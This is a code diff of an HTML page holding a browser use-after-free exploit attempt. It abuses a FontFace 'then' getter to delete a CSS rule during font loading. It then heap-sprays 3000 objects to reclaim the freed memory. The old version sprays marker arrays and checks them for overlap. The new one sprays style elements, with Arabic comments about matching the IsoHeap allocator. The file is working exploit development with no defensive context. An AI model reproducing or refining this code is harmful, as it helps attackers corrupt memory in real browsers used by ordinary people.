@@ -1,58 +1,32 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <style>
-        body { background: #000; color: #0f0; font-family: monospace; font-size: 20px; padding: 20px; }
-        #debug { white-space: pre-wrap; word-wrap: break-word; }
-    </style>
-</head>
-<body>
-    <div id="debug">Initializing...</div>
-    <style id="fontStyle">@font-face { font-family: 'TargetFont'; src: url(nonexistent.woff); }</style>
+<script>
+    let sprayedCSS = [];
 
-    <script>
-        const debug = document.getElementById('debug');
-        function log(msg) { debug.innerText += "\n[+] " + msg; }
+    function trigger() {
+        // إنشاء عنصر DOM وسيط لاستخدامه كـ "مُشغل" (Trigger)
+        let div = document.createElement('div');
+        document.body.appendChild(div);
 
-        let sprayed = [];
-        
-        function trigger() {
-            log("Starting UAF...");
-            let font = new FontFace('TargetFont', 'local(Arial)', { unicodeRange: 'U+0041' });
-            document.fonts.add(font);
+        let font = new FontFace('TargetFont', 'local(Arial)', { unicodeRange: 'U+0041' });
+        document.fonts.add(font);
 
-            Object.defineProperty(FontFace.prototype, 'then', {
-                get() {
-                    document.getElementById('fontStyle').sheet.deleteRule(0);
-                    log("Rule deleted. Spraying...");
-                    
-                    // Spraying 3000 objects
-                    for (let i = 0; i < 3000; i++) {
-                        sprayed.push({
-                            // جربنا 32، الآن سنستخدم مصفوفة ثابتة الحجم للتأكد من المحاذاة (Alignment)
-                            data: new Array(24).fill(0x1337), 
-                            id: i
-                        });
-                    }
-                    log("Spray complete. Verifying...");
-                    return undefined;
+        Object.defineProperty(FontFace.prototype, 'then', {
+            get() {
+                // 1. الحذف
+                document.getElementById('fontStyle').sheet.deleteRule(0);
+                
+                // 2. الهجوم: إنشاء كائنات CSS مكثفة (أكثر توافقاً مع IsoHeap)
+                for (let i = 0; i < 3000; i++) {
+                    // ننشئ كائنات CSS حقيقية، هي أقرب في الذاكرة لـ CSSFontFace
+                    let s = document.createElement('style');
+                    s.textContent = '.a' + i + '{color:red}';
+                    document.head.appendChild(s);
+                    sprayedCSS.push(s);
                 }
-            });
-            font.load();
-        }
+                return undefined;
+            }
+        });
+        font.load();
+    }
 
-        setTimeout(() => {
-            trigger();
-            setTimeout(() => {
-                let found = -1;
-                for(let i=0; i<sprayed.length; i++) {
-                    // التحقق من "تمزق" البيانات
-                    if(sprayed[i].data[0] !== 0x1337) { found = i; break; }
-                }
-                if(found !== -1) log("SUCCESS: Overlap at index " + found);
-                else log("FAILED: Buffers intact. Changing padding size needed.");
-            }, 1000);
-        }, 500);
-    </script>
-</body>
-</html>
+    setTimeout(trigger, 1000);
+</script>
